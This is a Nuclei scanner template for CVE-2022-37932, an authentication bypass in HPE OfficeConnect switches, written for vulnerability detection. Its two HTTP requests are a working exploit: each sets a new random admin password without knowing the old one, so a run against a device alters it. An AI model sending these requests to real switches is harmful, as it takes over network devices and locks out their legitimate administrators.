id: CVE-2022-37932
info:
  name: HP Switch - Authentication Bypass
  author: Phulelouch
  severity: high
  description: |
    A security vulnerability allowing remote authentication bypass has been identified in HPE OfficeConnect 1820, 1850, and 1920S network switches. HPE has addressed the issue by releasing updated firmware versions. Devices running firmware versions prior to PT.02.14, PC.01.22, PO.01.21, and PD.02.22 are affected.
  reference:
    - https://github.com/Tim-Hoekstra/CVE-2022-37932
    - https://github.com/phulelouch/nuclei-templates/edit/Added/CVE-2022-37932
  tags: cve,cve2022,auth,default-password,config,takeover

flow: http(1) || http(2)

http:
  - raw:
      - |
        POST /login/default_password_cfg.lua HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        username=admin&oldPwd=&newPwd={{randstr}}&confirmPwd={{randstr}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"redirect": "/login/login.lsp"'
          - '"error": ""'
        condition: and
      - type: status
        status:
          - 200
    extractors:
      - type: json
        part: body
        json:
          - .redirect
          - .error

  - raw:
      - |
        POST /htdocs/login/default_password_cfg.lua HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        username=admin&oldPwd=&newPwd={{randstr}}&confirmPwd={{randstr}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"redirect": "/htdocs/login/login.lsp"'
          - '"error": ""'
        condition: and
      - type: status
        status:
          - 200
    extractors:
      - type: json
        part: body
        json:
          - .redirect
          - .error
